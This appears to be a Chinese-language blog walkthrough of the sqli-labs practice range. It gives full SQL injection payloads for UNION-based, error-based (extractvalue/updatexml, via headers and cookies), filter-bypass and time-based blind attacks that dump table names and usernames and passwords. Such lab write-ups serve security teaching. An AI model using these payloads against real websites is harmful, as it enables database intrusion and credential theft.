---
 title: SQL-labs过关笔记
 date: 2020-12-26 14:12:00
 categories: 技术
 tags: []
 urlname: 16
--- 
SQL-labs靶场搭建；
①docker搭建：[参考链接][1]，博文还提供通关指南
②本地搭建：Github[链接][2]，将下载后的文件夹放入phpstudy中的www目录下，开启phpstudy的Apache和mysql服务，之后就可以通过`http://本机ip/sqli-labs` 访问靶场进行关卡选择

过关参考（**部分**）：
对于一般的靶场实验要求，主要的步骤为：测试是否存在SQL注入，寻找注入点->爆库名、表名、列名、记录
一些不同的关卡通关方式也比较类似，所以针对相同的一些步骤这里只进行简要说明。
1、Less-1
(1)根据提示“Please input the ID as parameter with numeric value”可知为GET方法，数据在URL中，所以构造URL：`http://127.0.0.1/sqli-labs/Less1/?id=1 || 2` 并访问，如下显示 id 对应用户名和密码：
![Less-1.1][3]
![Less-1.2][4]
(2)构造URL：`http://127.0.0.1/sqli-labs/Less-1/?id=2-1` 并访问，显示 id=2 的用户信息页面，证明该注入点并非数字型注入
![less-1.3][5]
(3)构造URL：`http://127.0.0.1/sqli-labs/Less-1/?id=2'` 并访问，页面返回了SQL语法报错信息，证明单引号已经拼接到后台SQL语句中，起到了闭合作用，并影响了后台SQL查询行为
![less-1.4][6]
(4)构造URL：`http://127.0.0.1/sqli-labs/Less-1/?id=1' --+`访问，前者页面返回了数据库报错信息，后者页面返回正常，又--+在数据库中表示注释，猜测该系统后台SQL查询语句应该类似于如下语句：
    SELECT username, password WHERE t_user WHERE UserID = '1' LIMIT 0,1
![less-1.5][7]
(5)通过ORDER BY判断表的列数，因为 ORDER BY num 通过按第num列将元组排序，当num超过列数时返回错误信息，所以可以通过它判断表的列数，提交的URL格式为： `http://127.0.0.1/sqli-labs/Less-1/?id=1' ORDER BY num--+`，将 ORDER BY 的数字num从2逐步增大到3页面返回正常，直到增大为4时页面返回报错信息"Unknown column"，表明数据表的列数为3列：
![less-1.6][8]
(6)找注入点：将 id=1 改为一个数据库不存在的 id 值，如-1，因为不存在 id 为-1 的所以前面的查询为空(也可以使用id=1 and 1=2，只要保证联合查询前者为空)，通过联合查询显示后面的查询结果。因为已得出有三列，使用 union select 1,2,3 联合查询语句查看页面是否有显示位，构造的 URL 如下：`http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3--+`，返回页面表明有两个显示位，分别显示了数字 2、3，可通过这两个显示位爆出需要的数据，界面如下：
![less-1.7][9]
(7)爆库名：构造URL ： `http://127.0.0.1/sqli-labs/Less-1/?id=-1' UNION SELECT 1,database(),3--+`，在第二个显示位得到数据库名称位security，如图：
![less-1.8][10]
(8)爆表名：构造URL：`http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+`，其中information_schema是所有数据库中都存在的表，通过group_concat把所有的表名从information_schema 中查询出，爆出库中的有 4 张表:emails,referers,uagents,users，猜测其中用户名表名为 users，如下图：
![less-1.9][11]
(9)爆列名：构造URL：`http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+`，爆出列名有 id、username、password，如图：
![less-1.10][12]
(10)爆记录：对关心的用户名和密码进行爆破，构造如下URL：`http://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,group_concat(username,":",password) from users--+` ，其中”:”整体可以替换为十六进制表示的 0x3a，同样能被MySQL识别，如图：
![less-1.11][13]

2、Less-2
经尝试猜测的后台SQL语句如下：

    SELECT * FROM users WHERE id=$id LIMIT 0,1
所以构造URL时不需要单引号等等这些闭合手段，其余和关卡一类似
3、Less-3
经尝试猜测的后台SQL语句如下：

    SELECT * FROM users WHERE id=('$id') LIMIT 0,1
所以构造URL时使用')闭合，其余步骤类似

4、Less-4
经尝试猜测后台的SQL语句如下：

    SELECT * FROM users WHERE id=("$id") LIMIT 0,1
所以构造URL时使用")闭合，和关卡3类似

5、Less-5
单引号闭合，和关卡6类似，在关卡6进行详细说明

6、Less-6
(1)首先按照提示在url中输入`?id=1`观察发现无login name和password回显
![less-6.1][14]
(2)构造 `URL：http://127.0.0.1/sqli-labs/Less-6/?id=1'`并访问，页面正常说明单引号没有拼接到后台 SQL 语句，再使用双引号闭合页面提示SQL语句语法错误，说明双引号被拼接到后台
![less-6.2][15]
(3)构造 URL：`http://127.0.0.1/sqli-labs/Less-6/?id=1" ORDER BY 2--+`，数字增大为 4 时页面返回报错信息，表明数据表的列数为3列
![less-6.3][16]

**爆破：**由于没有回显位，所以使用extractvalue(xml_frag,xpath_expr)函数，其中字符串参数：XML标记片段 xml_frag和XPath表达式 xpath_expr（也称为定位器）; 它返回CDATA第一个文本节点的text()，该节点是XPath表达式匹配的元素的子元素。当xpath格式错误时，函数的报错信息显示XPATH syntax error:第二个参数的信息/执行结果。所以可以利用这个函数的特性，将想要获得的数据库内容放在第二个参数的位置，通过报错信息显示出来。（updatexml函数也有类似效果）
(4)爆库名：构造 URL：`http://127.0.0.1/sqli-labs/Less-6/?id=1"and extractvalue(1,concat(0x23,database(),0x23))--+`，concat函数可用可不用，将#和想要获取数据库的数据库内容用concat连接起来只是为了突出显示，也可以单独extractvalue(1,database())
![less-6.4][17]
(5)爆表名：构造URL: `http://127.0.0.1/sqli-labs/Less-6/?id=1"and extractvalue(1,concat(0x23,(select table_name from information_schema.tables where table_schema=database() limit num,1),0x23))--+`，其中num的数值从0开始逐一递增将所有表名回显。limit函数用于强制sql语句返回指定记录数，接受一个或两个整型参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目，由于回显位限制，每次只能一行，因此通过改变第一个参数将表名遍历。
![less-6.5][18]
(6)爆列名：构造URL：`http://127.0.0.1/sqli-labs/Less-6/?id=1"and extractvalue(1,concat(0x23,(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit num,1),0x23))--+`，num从0开始逐一递增，users表的列名有id, usrname, password
![less-6.6][19]
(7)爆记录：构造URL：`http://127.0.0.1/sqli-labs/Less-6/?id=1"and extractvalue(1,concat(0x23,(select username from users limit 1,1),0x23))--+`，用户名回显后将username改为paswword
![less-6.7][20]
![less-6.8][21]

Less-7~Less-9可以参考开头的链接

7、Less-11
POST表单提交，使用单引号闭合，和关卡12类似，在关卡12进行详细说明

8、Less-12
(1)为POST表单提交，在username中输入 `' or 1=1 #`登陆失败，说明单引号'不作为闭合，则尝试使用双引号做闭合，依旧报错，再次尝试加上括号闭合。使用`") or 1=1 #`，")闭合成功，同时注入 or 1=1这个一定为真的条件，#注释后面的内容
![less-12.1][22]
(2)在username文本框输入：`") or 1=1 order by num #`，将num从2开始逐一增加，当num为3时报错，说明列数为2
![less-12.2][23]
(3)在username文本框中输入：`1") and 1=2 union select 1,2#`，有两个显示位，爆破数据库信息可以利用这两个显示位
![less-12.3][24]
(4)爆数据库信息和利用URL栏的GET方法是类似的，步骤同理关卡1。
   爆库：`1") and 1=2 union select 1,database()#`
   爆表：`1") and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #`
   爆列名：`1") and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' #`
   爆记录：`1") and 1=2 union select 1,2,group_concat(username,":",password) from users #`

9、Less-13
类似关卡12，不同点在于使用`')`闭合

10、Less-14
类似关卡12，不同点在于使用`"`闭合

11、Less-18
(1)为 POST 表单提交，在 username 中输入`'or 1=1 #`和`" or 1=1 #`等都显示登录失败，查看php文件，发现uname和passwd都做了check_input特殊处理
![less-18.1][25]
(2)check_input函数中，magic_quotes_gpc判断解析用户提示的数据，在magic_quotes_gpc = On的情况下，如果输入的数据有单引号（'）、双引号（"）、反斜线（\\）与 NULL等字符都会被加上反斜线。stripslashes()删除由 addslashes() 函数添加的反斜杠、ctype_digit()判断是不是数字，mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符，intval() 进行整型转换。这说明username和password都不能作为注入点。
![less-18.2][26] 
(3)用户名和密码输入admin，页面有user-agent的回显，猜测注入点在user-agent，使用单引号闭合。
![less-18.3][27]
(4)爆库名：使用burpsuit抓包，将User-Agent改为SQL注入语句: `'and extractvalue(1,concat(0x23,(select database()),0x23)) and '`，通过报错注入将数据名回显
![less-18.4][28]
(5)爆表名：可以选择使用updatexml报错回显，payload为`1',1,updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23),1)) #`，也可以使用extractvalue报错回显，payload为`'and extractvalue(1,concat(0x23,( select group_concat(table_name) from information_schema.tables where table_schema=database()),0x23)) and '`
![less-18.5][29]
![less-18.6][30]
(6)爆列名：使用updatexml函数报错注入，payload为 `',updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_name='uagents'),0x23),1)) #`
![less-18.7][31]
(7)爆记录：使用updatexml报错注入，payload为：`',updatexml(1,concat(0x23,(select group_concat(username,":",password) from users),0x23),1)) #`，有长度限制所以只显示了部分，则也可以username和password分别使用`',updatexml(1,concat(0x23,(select username/password from users limit num,1),0x23),1)) #` （num从0开始逐一递增）将数据一个一个回显
![less-18.8][32]
![less-18.9][33]

12、Less-19
和关卡18类似，注入点在referer

13、Less-20
和关卡18类似，注入点在cookie

14、Less-26
(1)根据提示输入`?id=1`，用户名和密码显示正常，添加单引号`'`，提示语法错误，说明单引号被拼接到后台SQL查询语句，添加--+注释发现依旧报错，猜测对--+进行了过滤。
![less-26.1][34]
![less-26.2][35]
(2)使用`'`闭合，对于注释/结尾字符，用`;%00`作为结尾
![less-26.3][36]
(3)使用order by，页面报错显示or被过滤，使用双写、空格、注释等多次尝试，发现空格，or，and,/*,#,–,/等符号都被过滤。直接采用报错注入方式。
![less-26.4][37]
(4)爆库名：构造payload为`?id=1' aandnd(updatexml(1,concat(0x23,database(),0x23),1));%00`，使用双写避免and被过滤，windows上的apache对空格编码的转义有问题，需要使用()绕过空格
![less-26.5][38]
(5)爆表名：构造payload为：`?id=1' || updatexml(1, concat(0x7e, (select (group_concat(table_name)) from (infoorrmation_schema.tables) where (table_schema=database()))) ,1)  || '1'='1`，其中由于information存在or，需要双写。
![less-26.6][39]
(6)爆列名：与爆表名类似，构造payload为：`id=1' || updatexml(1, concat(0x7e, (select (group_concat(column_name)) from (infoorrmation_schema.columns) where (table_name='users'))) ,1)  || '1'='1`
![less-26.7][40]
(7)爆记录：构造payload为将用户名和密码从users表中回显：`id=1' || updatexml(1, concat(0x23, (select (group_concat(  concat_ws(0x7e,username, passwoorrd)  )) from (users))) ,1)  || '1'='1`
![less-26.8][41]
也可以使用`id=1' || updatexml(1, concat(0x7e, (select (group_concat( concat_ws(0x7e,username,passwoorrd))) from (users) where(id=num))) ,1)  || '1'='1`，通过改变id的值单个记录显示
![less-26.9][42]
15、Less-64
(1)构造`id=1'`，页面没有显示用户信息也没有SQL语句语法报错，则添加--+注释，对id=1'、id=1"、id=1')、id=")、id=1))等依次尝试，当`id=))--+`时页面返回id=1的用户信息
![less-64.1][43]
(2)构造`id=1)) order by num--+`，num从1开始递增，当num为3时页面正常，num为4时无显示，说明数据有3列
![less-64.2][44]
(3)使用联合查询找注入点，结果不可行
![less-64.3][45]
(4)使用时间注入方式判断，payload为`id=1)) and sleep(3)--+`，有延迟，进行时间注入
(5)数据库名长度：构造payload为`id=1)) and if(length(database())=8,1,sleep(2))--+`，页面返回正确且较快，当长度为7和9时都有延迟，说明数据库名长度为8
![less-64.4][46]
(6)构造payload：`id=1)) and if(left(database(),1)='s' , sleep(3), 1) --+`，页面返回正确且较快，当为其他的字母时有延迟。通过改变`left(database(),num)`中num的大小以及匹配的字符，将数据库名得出
![less-64.5][47]
(7)由于手动一次次尝试较为麻烦，可以使用burpsuit进行爆破，url中payload为`id=1))and if(left(database(),1)='s' , sleep(1), 1) --+`，使用burp抓包，将数据发送给intruder，清除原有变量，重新选定变量为第num个字符和字符，配置有效载荷进行爆破。但是由于Less-64只提供130次尝试，所以有限制。
![less-64.6][48]
![less-64.7][49]
(8)数据库名：构造payload：`id=1))and if(left(database(),8)='security' , sleep(2), 1) --+`，页面返回正常且较快则说明数据库名为security
(9)爆表：构造payload：`id=1)) and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='e',1,sleep(2))--+`，和数据库名的爆破相同，仅需修改substr的第二个参数值和设定的字符。
(10)爆列：构造payload为：`id =1)) and if(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='u',1,sleep(2))--+`，修改substr的第二个参数值和设定的字符。
(11)爆记录：构造payload为：`id=1))and if(substr((select username from security.users limit 0,1),1,1)='d',1,sleep(2))--+`，修改substr的第二个参数和设定的字符，密码爆破相同


  [1]: https://blog.csdn.net/qq_39670065/article/details/106762824?utm_medium=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-OPENSEARCH-1.control
  [2]: https://github.com/Audi-1/sqli-labs
  [3]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.1.png
  [4]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.2.png
  [5]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.3.png
  [6]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.4.png
  [7]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.5.png
  [8]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.6.png
  [9]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.7.png
  [10]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.8.png
  [11]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.9.png
  [12]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.10.png
  [13]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-1.11.png
  [14]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.1.png
  [15]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.2.png
  [16]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.3.png
  [17]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.4.png
  [18]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.5.png
  [19]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.6.png
  [20]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.7.png
  [21]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-6.8.png
  [22]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-12.1.png
  [23]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-12.2.png
  [24]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-12.3.png
  [25]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.1.png
  [26]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.2.png
  [27]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.3.png
  [28]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.4.png
  [29]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.5.png
  [30]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.6.png
  [31]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.7.png
  [32]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.8.png
  [33]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-18.9.png
  [34]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.1.png
  [35]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.2.png
  [36]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.3.png
  [37]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.4.png
  [38]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.5.png
  [39]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.6.png
  [40]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.7.png
  [41]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.8.png
  [42]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-26.9.png
  [43]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.1.png
  [44]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.2.png
  [45]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.3.png
  [46]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.4.png
  [47]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.5.png
  [48]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.6.png
  [49]: https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/sql-labs/less-64.7.png